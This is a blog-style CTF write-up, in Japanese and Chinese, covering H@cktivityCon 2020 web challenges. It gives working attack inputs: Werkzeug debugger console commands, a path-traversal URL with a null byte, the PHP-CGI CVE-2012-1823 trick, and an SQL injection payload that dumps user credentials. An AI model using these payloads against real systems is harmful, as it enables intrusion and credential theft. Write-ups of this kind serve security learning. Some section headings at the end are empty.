---
layout: post
title:  H@cktivityCon CTF Writeup
date:   2020-08-01 10:11:34 -0400
categories: CTF
---

このCTFはhackeroneさんが開催したのCTFですね。今回は見学のようにチームBlack Bauhiniaのみなさんと一緒に遊びましたが、ほとんどチームのみなさんがわたしより早く問題解いたので。二つのフラグしか入れた。

昔からhackeroneでBug Bountyを始めると思ってますがmethodologyがわからないから全然やったことありません。

***

#Web

##Ladybug

打開了題目給的link，用wappalyzer看到是用Flask

試了在/film後面亂打東西，就出了AssertionError出來。查了一下是Werkzeug的debugger
之後去/console就能拿到個在行python的console，在裡面跑os的command把flag找出來就行了
```python
>>>import os
>>>os.listdir()
>>>a=open('flag.txt','r')
>>>a.read()
```
![Ladybug](/images/Hacktivitycon-CTF/flag.PNG)

##Bite

很令人懷念的null byte attack

如果在page打xxx上去，他會說沒有xxx.php，所以加```%00```在後面把.php去掉就行了
之後就用運把flag.txt找出來:P

```jh2i.com:50010/?page=../../../../../flag.txt%00```

![bite](/images/Hacktivitycon-CTF/bite.PNG)

##GI Joe

這個聽說也是很舊的東西，CVE也好像是2012年的東西

在URL後面加```?-s```的話，就能看到那個page的source code

參考著徳丸さん的記事 https://blog.tokumaru.org/2012/05/php-cgi-remote-scripting-cve-2012-1823.html

在Burp suite request payload過去(下圖)，flag就出來了

![GIJoe](/images/Hacktivitycon-CTF/GIJoe.PNG)

##Waffle Land

在search那邊發現到SQL injection，

```SQL
' and 0 union/**/select 1,GROUP_CONCAT(username),GROUP_CONCAT(password),4,5 FROM user -- #
```

然後就能拿到admin的password```admin:NT7b#ed4$J?eZ#m_```，再去Login就有flag了

##Lightweight Contact Book

#Binarty Exploitation

##Pancakes


#Scripting

##Misdirection
